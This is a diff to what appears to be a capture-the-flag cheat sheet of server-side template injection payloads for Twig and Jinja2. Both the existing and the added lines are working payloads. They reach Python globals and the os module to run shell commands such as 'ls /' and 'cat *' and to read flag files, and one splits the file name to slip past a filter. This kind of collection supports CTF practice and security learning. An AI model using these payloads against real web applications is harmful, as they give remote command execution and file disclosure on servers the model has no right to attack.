@@ -35,6 +35,9 @@ user={{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter(
 {{url_for['__glob'~'als__']}}
 {{url_for['__glob'~'als__']['__built'~'ins__']['eval']("next(open('/flag'))")}}
 {{url_for['__glob'~'als__']['os']['popen']("cat *")['read']()}}
+
+{{ config.__class__.__init__.__globals__['os'].__getattribute__('popen')('ls /').read() }} 
+{{ config.__class__.__init__.__globals__['os'].__getattribute__('popen')('cat /this_is_the_fla""g.txt').read() }} 
 ```
 
 ### ssti 服务器模板注入 jinja2
